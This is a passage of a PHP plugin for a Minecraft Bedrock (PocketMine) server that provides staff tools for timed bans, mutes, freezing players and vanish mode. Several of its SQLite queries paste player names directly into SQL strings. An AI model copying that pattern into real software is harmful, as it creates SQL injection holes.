		if (!empty($array)) {
			$banTime = $array['muteTime'];
			$reason = $array['reason'];
			$staff = $array['staff'];
			$now = time();
			if($banTime < $now){
				$banplayer = $this->mutedPlayer[$player->getName()];
				$banInfo = $this->mt->query("SELECT * FROM plaayersMute WHERE player = '$banplayer';");
				$array = $banInfo->fetchArray(SQLITE3_ASSOC);
				if (!empty($array)) {
					$this->mt->query("DELETE FROM plaayersMute WHERE player = '$banplayer';");
					$player->sendMessage($this->message["AutoUnMutePlayer"]);
				}
				unset($this->mutedPlayer[$player->getName()]);
				return true;
			}
			$remainingTime = $banTime - $now;
			$day = floor($remainingTime / 86400);
			$hourSeconds = $remainingTime % 86400;
			$hour = floor($hourSeconds / 3600);
			$minuteSec = $hourSeconds % 3600;
			$minute = floor($minuteSec / 60);
			$remainingSec = $minuteSec % 60;
			$second = ceil($remainingSec);
			
			$text = str_replace(["{day}", "{hour}", "{minute}", "{second}", "{reason}", "{staff}"], [$day, $hour, $minute, $second, $reason, $staff], $this->message["MuteInfoUI"]);
		}
		$form->setTitle(TE::BOLD . $banPlayer);
		
		$form->setContent($text);
		$form->addButton("§l§cDESMUTEAR JUGADOR");
		$form->sendToPlayer($player);
		return $form;
	}

//============  LOGIN TEMPBAN CONFIGURATION ==========//

public function onPlayerLogin(PlayerLoginEvent $ev){
		$pl = $ev->getPlayer();
		$banplayer = $pl->getName();
		$banInfo = $this->lx->query("SELECT * FROM banPlayers WHERE player = '$banplayer';");
		$array = $banInfo->fetchArray(SQLITE3_ASSOC);
		
		if (!empty ($array)) {
			
			$banTime = $array['banTime'];
			$reason = $array['reason'];
			$staff = $array['staff'];
			$now = time();
			
			if ($banTime > $now) {
				
				$remainingTime = $banTime - $now;
				$day = floor($remainingTime / 86400);
				$hourSeconds = $remainingTime % 86400;
				$hour = floor($hourSeconds / 3600);
				$minuteSec = $hourSeconds % 3600;
				$minute = floor($minuteSec / 60);
				$remainingSec = $minuteSec % 60;
				$second = ceil($remainingSec);
$pl->kick(str_replace(["{day}", "{hour}", "{minute}", "{second}", "{reason}", "{staff}"], [$day, $hour, $minute, $second, $reason, $staff], $this->message["LoginBanTempMessage"]));

				
			} else {
				
				$this->lx->query("DELETE FROM banPlayers WHERE player = '$banplayer';");
			
			}
		}
	}
	 

//============  TEMPBAN UI CONFIGURATION ==========//
public function hitBanUI(EntityDamageEvent $event){
		if($event instanceof EntityDamageByEntityEvent) {
			$damager = $event->getDamager();
			$victim = $event->getEntity();
			if($damager instanceof Player && $victim instanceof Player){
$name = $damager->getName();
				
if ($damager->getInventory()->getItemInHand()->getCustomName() === TE::DARK_RED."BanTemp"."\n".TE::GRAY."Toca al jugador con el Item") {
					$event->cancel();
					$this->targetPlayer[$damager->getName()] = $victim->getName();
					$this->getBanUI($damager);
				
} 
			}
		}
	}


public function getBanList(Player $pl){
		$form = new SimpleForm(function (Player $pl, $data = null) {
			$target = $data;
			if ($target === null) {
				return true;
			}
			$this->targetPlayer[$pl->getName()] = $target;
			$this->getBanUI($pl);
		});
		
		$form->setTitle("§c§lLista de jugadores");
		$form->setContent("§eSelecciona un jugador para continuar");
		
		foreach (Server::getInstance()->getOnlinePlayers() as $on) {
			
			$form->addButton(TE::RED.$on->getName(), -1, "", $on->getName());
		
		}
		
		$form->sendToPlayer($pl);
		
		return $form;
	
	}


public function getBanUI($player){
		$form = new CustomForm(function (Player $player, array $data = null){
			if($data === null){
				return true;
			}
			$result = $data[0];
			if(isset($this->targetPlayer[$player->getName()])){
				if($this->targetPlayer[$player->getName()] == $player->getName()){
					$player->sendMessage($this->message["BanMe"]);
					return true;
				}
				$now = time();
				$day = ($data[1] * 86400);
				$hour = ($data[2] * 3600);
				if($data[3] > 1){
					$min = ($data[3] * 60);
				} else {
					$min = 60;
				}
				$banTime = $now + $day + $hour + $min;
				$banInfo = $this->lx->prepare("INSERT OR REPLACE INTO banPlayers (player, banTime, reason, staff) VALUES (:player, :banTime, :reason, :staff);");
				$banInfo->bindValue(":player", $this->targetPlayer[$player->getName()]);
				$banInfo->bindValue(":banTime", $banTime);
				$banInfo->bindValue(":reason", $data[4]);
				$banInfo->bindValue(":staff", $player->getName());
				$banInfo->execute();
				$target = $this->getServer()->getPlayerExact($this->targetPlayer[$player->getName()]);
				if($target instanceof Player){
					$target->kick(str_replace(["{day}", "{hour}", "{minute}", "{reason}", "{staff}"], [$data[1], $data[2], $data[3], $data[4], $player->getName()], $this->message["BanTempMessage"]));
					$this->Lightning($target);
				}
				$this->getServer()->broadcastMessage(str_replace(["{player}", "{day}", "{hour}", "{minute}", "{reason}", "{staff}"], [$this->targetPlayer[$player->getName()], $data[1], $data[2], $data[3], $data[4], $player->getName()], $this->message["BanTempBroadcast"]));
				unset($this->targetPlayer[$player->getName()]);

			}
		});
		$list[] = $this->targetPlayer[$player->getName()];
		$form->setTitle("§c§lBAN TEMPORAL");
		$form->addDropdown("\nJugador seleccionado", $list);
		$form->addSlider("Dias", 0, 30, 1);
		$form->addSlider("Horas", 0, 24, 1);
		$form->addSlider("Minutos", 0, 60, 5);
		$form->addInput("Razón");
		$form->sendToPlayer($player);
		return $form;
	}


	public function getCheckBanUI($player){
		$form = new SimpleForm(function (Player $player, $data = null){
			if($data === null){
				return true;
			}
			$this->targetPlayer[$player->getName()] = $data;
			$this->getBanInfoUI($player);
		});
		$banInfo = $this->lx->query("SELECT * FROM banPlayers;");
		$array = $banInfo->fetchArray(SQLITE3_ASSOC);	
		if (empty($array)) {
			$player->sendMessage($this->message["NoBanPlayers"]);
			return true;
		}
		$form->setTitle(TE::RED."LISTA BANEADOS");
		$form->setContent("Lista de jugadores baneados, toca para ver su información o desbanearlos");
		$banInfo = $this->lx->query("SELECT * FROM banPlayers;");
		$i = -1;

		$players = [];

		while ($resultArr = $banInfo->fetchArray(SQLITE3_ASSOC)) {
			$j = $i + 1;
			$banPlayer = $resultArr['player'];
			$players[] = $banPlayer;
			$i = $i + 1;
		}

		sort($players);

		foreach ($players as $pp){
			$form->addButton(TE::BOLD . "$pp", -1, "", $pp);
		}

		$form->sendToPlayer($player);
		return $form;
	}
	public function getBanInfoUI($player){
		$form = new SimpleForm(function (Player $player, int $data = null){
		$result = $data;
		if($result === null){
			return true;
		}
			switch($result){
				case 0:
					$banplayer = $this->targetPlayer[$player->getName()];
					$banInfo = $this->lx->query("SELECT * FROM banPlayers WHERE player = '$banplayer';");
					$array = $banInfo->fetchArray(SQLITE3_ASSOC);
					if (!empty($array)) {
						$this->lx->query("DELETE FROM banPlayers WHERE player = '$banplayer';");
						$player->sendMessage(str_replace(["{player}"], [$banplayer], $this->message["UnBan"]));
					}
					unset($this->targetPlayer[$player->getName()]);
				break;
			}
		});
		$banPlayer = $this->targetPlayer[$player->getName()];
		$banInfo = $this->lx->query("SELECT * FROM banPlayers WHERE player = '$banPlayer';");
		$array = $banInfo->fetchArray(SQLITE3_ASSOC);
		$text = TE::RED . " Error " . $banPlayer . " información!";
		if (!empty($array)) {
			$banTime = $array['banTime'];
			$reason = $array['reason'];
			$staff = $array['staff'];
			$now = time();
			if($banTime < $now){
				$banplayer = $this->targetPlayer[$player->getName()];
				$banInfo = $this->lx->query("SELECT * FROM banPlayers WHERE player = '$banplayer';");
				$array = $banInfo->fetchArray(SQLITE3_ASSOC);
				if (!empty($array)) {
					$this->lx->query("DELETE FROM banPlayers WHERE player = '$banplayer';");
					$player->sendMessage($this->message["AutoUnBanPlayer"]);
				}
				unset($this->targetPlayer[$player->getName()]);
				return true;
			}
			$remainingTime = $banTime - $now;
			$day = floor($remainingTime / 86400);
			$hourSeconds = $remainingTime % 86400;
			$hour = floor($hourSeconds / 3600);
			$minuteSec = $hourSeconds % 3600;
			$minute = floor($minuteSec / 60);
			$remainingSec = $minuteSec % 60;
			$second = ceil($remainingSec);
			
			$text = str_replace(["{day}", "{hour}", "{minute}", "{second}", "{reason}", "{staff}"], [$day, $hour, $minute, $second, $reason, $staff], $this->message["BanInfoUI"]);
		}
		$form->setTitle(TE::BOLD . $banPlayer);
		
		$form->setContent($text);
		$form->addButton("§l§cDESBANEAR JUGADOR");
		$form->sendToPlayer($player);
		return $form;
	}
	
	
//============  FREEZE  ==========//
public function onMove(PlayerMoveEvent $event) : void {
		$player = $event->getPlayer();
		if(in_array($player->getName(), $this->frozen)) {

			$event->cancel();
			$player->sendActionBarMessage($this->update->get("title"));
			$player->sendTitle($this->update->get("actionbar"));
		}
	}

		
public function hitFreeze(EntityDamageEvent $event){
		if($event instanceof EntityDamageByEntityEvent) {
			$damager = $event->getDamager();
			$victim = $event->getEntity();
			if($damager instanceof Player && $victim instanceof Player){
if(in_array($victim->getName(), $this->frozen)) {
$event->cancel();
$damager->sendMessage($this->freeze . $this->update->get("attack"));
} 
if ($damager->getInventory()->getItemInHand()->getCustomName() === TE::DARK_AQUA."Freeze"."\n".TE::GRAY."Toca al jugador con el Item") {
					$event->cancel();

					if(in_array($victim->getName(), $this->frozen)) {

array_splice($this->frozen, array_search($victim->getName(), $this->frozen), 1);
				$victim->sendMessage($this->freeze ."§bYa no estas congelado.");
				$victim->setImmobile(false);
				$victim->sendTitle("§l§bYa no estas", "§7Congelado!");
				$victim->setNameTag(str_replace($this->freeze_tag, "", $victim->getNameTag()));
				$this->getServer()->broadcastMessage($this->freeze . "§e" . $victim->getName() . "§r dejó de estar congelado. .");
				$victim->sendMessage($this->freeze ."§eEste jugador ya estába congelado");
				
			} else {
				array_push($this->frozen, $victim->getName());
				$victim->setImmobile(true);
				$this->getServer()->broadcastMessage($this->freeze ."§e" . $victim->getName() . "§r ha sido congelado."); // Adding to config soon.
				$victim->setNameTag($this->freeze_tag.$victim->getNametag());
				$victim->sendActionBarMessage($this->update->get("title"));
				$victim->sendTitle($this->update->get("actionbar"));
				 $victim->sendMessage($this->freeze . "§o§aHas sido congelado, habla con el staff");
				return true;
			}

} 
			}
		}
	}
	public function onAttack(EntityDamageByEntityEvent $event) : void {
		$damager = $event->getDamager();
		$entity = $event->getEntity();
		
		if($damager instanceof Player) {
			if(in_array($damager->getName(), $this->frozen)) {
				
					$event->cancel();
					$damager->sendMessage($this->freeze . $this->update->get("hit"));
			
			}
		}

	}
	public function onJoin(PlayerJoinEvent $event) : void {
		$player = $event->getPlayer();
		if(in_array($player->getName(), $this->frozen)) {
			$player->setImmobile(true);
			$player->setNameTag($this->freeze_tag.$player->getNametag()); 
			$player->sendMessage($this->freeze . $this->update->get("onjoin"));
		}
	}
	public function onQuit(PlayerQuitEvent $e) {
		$player = $e->getPlayer();
$dias = $this->update->get("days");
$horas = $this->update->get("hours");
$minutos = $this->update->get("minutes");
$razon = $this->update->get("reason");
$staff = "TheJacry";
		if(in_array($player->getName(), $this->frozen)) {
			if(!$this->update->get("autoban")) return false;
			else {
$now = time();
				$day = ($dias * 86400);
				$hour = ($horas * 3600);
				if ($minutos > 1) {
					$min = ($minutos * 60);
				} else {
					$min = 60;
				}
				$banTime = $now + $day + $hour + $min;
				$banInfo = $this->lx->prepare("INSERT OR REPLACE INTO banPlayers (player, banTime, reason, staff) VALUES (:player, :banTime, :reason, :staff);");
				$banInfo->bindValue(":player", $player->getName());
				$banInfo->bindValue(":banTime", $banTime);
				$banInfo->bindValue(":reason", $razon);
				$banInfo->bindValue(":staff", $staff);
				$banInfo->execute();
$this->getServer()->broadcastMessage(str_replace(["{player}", "{day}", "{hour}", "{minute}", "{reason}"], [$player->getName(), $dias, $horas, $minutos, $razon], $this->update->get("serverbanmsg")));
				} 
			}
		}
public function getFreezeList(Player $pl){
		$form = new SimpleForm(function (Player $pl, $data = null) {
			$target = $data;
			if ($target === null) {
				return true;
			}
			$this->Playercon[$pl->getName()] = $target;
//Freeze
$targe = $this->getServer()->getPlayerExact($this->Playercon [$pl->getName()]);
				if ($targe instanceof Player) {
			
if(in_array($targe->getName(), $this->frozen)) {
array_splice($this->frozen, array_search($targe->getName(), $this->frozen), 1);
				$targe->sendMessage($this->freeze ."§bYa no estas congelado.");
				$targe->setImmobile(false);
				$targe->sendTitle("§l§bYa no estas", "§7Congelado!");
				$targe->setNameTag(str_replace($this->freeze_tag, "", $targe->getNameTag()));
				$this->getServer()->broadcastMessage($this->freeze . "§e" . $targe->getName() . "§r dejó de estar congelado. .");
				$targe->sendMessage($this->freeze ."§eEste jugador ya estába congelado");
				
			} else {
				array_push($this->frozen, $targe->getName());
				$targe->setImmobile(true);
				$this->getServer()->broadcastMessage($this->freeze ."§e" . $targe->getName() . "§r ha sido congelado."); // Adding to config soon.
				$targe->setNameTag($this->freeze_tag.$targe->getNametag());
				$targe->sendActionBarMessage($this->update->get("title"));
				$targe->sendTitle($this->update->get("actionbar"));
				 $targe->sendMessage($this->freeze . "§o§aHas sido congelado, habla con el staff");

} 
} 
unset($this->Playercon[$pl->getName()]);
		});
		
		$form->setTitle("§c§lLista de jugadores");
		$form->setContent("§eSelecciona un jugador para congelar\descongelar");
		
		foreach (Server::getInstance()->getOnlinePlayers() as $on) {
			
			$form->addButton(TE::RED.$on->getName(), -1, "", $on->getName());
		
		}
		
		$form->sendToPlayer($pl);
		
		return $form;
	
	}


//============  VANISH ==========//


public function vanish(Player $player) {
        self::$vanish[] = $player->getName();
        unset(self::$online[array_search($player, self::$online, True)]);
        $player->setNameTag(TE::GOLD . "[V] " . TE::RESET . $player->getNameTag());
    

        
            $msg = $this->update->get("leave-message");
            $msg = str_replace("{name}", $player->getName(), $msg);
            $this->getServer()->broadcastMessage($msg);
        
        
            if ($player->getGamemode() === GameMode::SURVIVAL()) {
                self::$AllowCombatFly[] = $player->getName();
                $player->setFlying(true);
                $player->setAllowFlight(true);
           
        }
        foreach ($this->getServer()->getOnlinePlayers() as $onlinePlayer) {
            if ($onlinePlayer->hasPermission("vanish.cdm")) {
                $msg = $this->update->get("vanish");
                $msg = str_replace("{name}", $player->getName(), $msg);
                $onlinePlayer->sendMessage($msg);
            }
        }
    }

    public function unvanish(Player $player) {
        unset(self::$vanish[array_search($player->getName(), self::$vanish)]);
        self::$online[] = $player;
        $player->setNameTag(str_replace("[V] ", null, $player->getNameTag()));
        $player->setSilent(false);
        $player->getXpManager()->setCanAttractXpOrbs(true);
        
        foreach ($this->getServer()->getOnlinePlayers() as $onlinePlayer) {
            $onlinePlayer->showPlayer($player);
            if ($onlinePlayer->hasPermission("vanish.cdm")) {
                $msg = $this->update->get("unvanish");
                $msg = str_replace("{name}", $player->getName(), $msg);
                $onlinePlayer->sendMessage($msg);
            }
        }
        $pk = new PlayerListPacket();
        $pk->type = PlayerListPacket::TYPE_ADD;
        $pk->entries[] = PlayerListEntry::createAdditionEntry(
            $player->getUniqueId(),
            $player->getId(),
            $player->getDisplayName(),
            SkinAdapterSingleton::get()->toSkinData($player->getSkin()),
            $player->getXuid());
        foreach ($this->getServer()->getOnlinePlayers() as $p) {
            $p->getNetworkSession()->sendDataPacket($pk);
        }
        
            if ($player->getGamemode() === GameMode::SURVIVAL()) {
                unset(self::$AllowCombatFly[array_search($player->getName(), self::$AllowCombatFly)]);
                $player->setFlying(false);
                $player->setAllowFlight(false);
            
        }
        
            $player->getEffects()->remove(VanillaEffects::NIGHT_VISION());
        
        foreach ($player->getEffects() as $effect){
            $effect_duration = $effect->getDuration();
            $effect_amplifier = $effect->getAmplifier();
            $effect_id = $effect->getId();
            $player->getEffects()->remove($effect_id);
            $player->getEffects()->add(new EffectInstance(StringToEffectParser::getInstance()->fromId($effect_id), $effect_duration, $effect_amplifier, true));
        }
        
            $msg = $this->update->get("join-message");
            $msg = str_replace("{name}", $player->getName(), $msg);
            $this->getServer()->broadcastMessage($msg);
        
    }

public function onQuitVanish(PlayerQuitEvent $event) {
        $player = $event->getPlayer();
        $name = $player->getName();
        if(in_array($name, self::$vanish)) {
            

                unset(self::$vanish[array_search($name, self::$vanish)]);
           
        }
        if(in_array($player, self::$online, true)){
            unset(self::$online[array_search($player, self::$online, true)]);
            
        }
    }

    public function pickUpVanish(EntityItemPickupEvent $event) {
        if ($event->getEntity() instanceof Player) {
            if (in_array($event->getEntity()->getName(), self::$vanish)) {
                $event->cancel();
            }
        }
    }

    public function onDamageVanish(EntityDamageEvent $event) {
        $player = $event->getEntity();
        if($player instanceof Player) {
            $name = $player->getName();
            if(in_array($name, self::$vanish)) {
                
                    $event->cancel();
                
            }
        }
    }

    public function onPlayerBurnVanish(EntityCombustEvent $event) {
        $player = $event->getEntity();
        if($player instanceof Player) {
            $name = $player->getName();
            if(in_array($name, self::$vanish)) {
                
                    $event->cancel();
                
            }
        }
    }

    public function onExhaustVanish(PlayerExhaustEvent $event) {
        $player = $event->getPlayer();
        if(in_array($player->getName(), self::$vanish)){
            
                $event->cancel();
            
        }
    }

    public function onJoinVanish(PlayerJoinEvent $event){
        $player = $event->getPlayer();
        if(!in_array($player->getName(), self::$vanish)){
            if(!in_array($player, self::$online, true)) {
             self::$online[] = $player;
                
            }
        }
    }

    /**
     * @param PlayerJoinEvent $event
     * @priority HIGHEST
     */
    public function setNametag(PlayerJoinEvent $event){
        $player = $event->getPlayer();
        if (in_array($player->getName(), self::$vanish)){
            $player->setNameTag(TE::GOLD . "[V] " . TE::RESET . $player->getNameTag());
        }
    }

    public function onQuery(QueryRegenerateEvent $event) {
        $event->getQueryInfo()->setPlayerList(self::$online);
        foreach(Server::getInstance()->getOnlinePlayers() as $p) {
            if(in_array($p->getName(), self::$vanish)) {
                $online = $event->getQueryInfo()->getPlayerCount();
                $event->getQueryInfo()->setPlayerCount($online - 1);
            }
        }
    }

    

    /**
     * @param PlayerJoinEvent $event
     * @priority HIGHEST
     */
    public function silentJoin(PlayerJoinEvent $event) {
        if ($event->getPlayer()->hasPermission("vanish.cdm")) {
            
                    $event->setJoinMessage("");
                }else{
                    if (in_array($event->getPlayer()->getName(), self::$vanish)){
                        $event->setJoinMessage("");
                    }
        }
    }
    public function silentLeave(PlayerQuitEvent $event) {

        if ($event->getPlayer()->hasPermission("vanish.cdm")) {
            
                    $event->setQuitMessage("");
                    
                }else{
                    if (in_array($event->getPlayer()->getName(), self::$vanish)){
                        $event->setQuitMessage("");
                    }
            }
        }
        public $author = "EquineBee20418";
public function onAttackVanish(EntityDamageByEntityEvent $event){
        $damager = $event->getDamager();
        $player = $event->getEntity();
        
        if ($damager != null and $damager instanceof Player and $player instanceof Player){
            if (!$damager->hasPermission("vanish.attack")){
                if (in_array($damager->getName(), self::$vanish)){
                    $damager->sendMessage($this->update->get("no-golpear"));
                    $event->cancel();
                }
            }
        }
    }

}
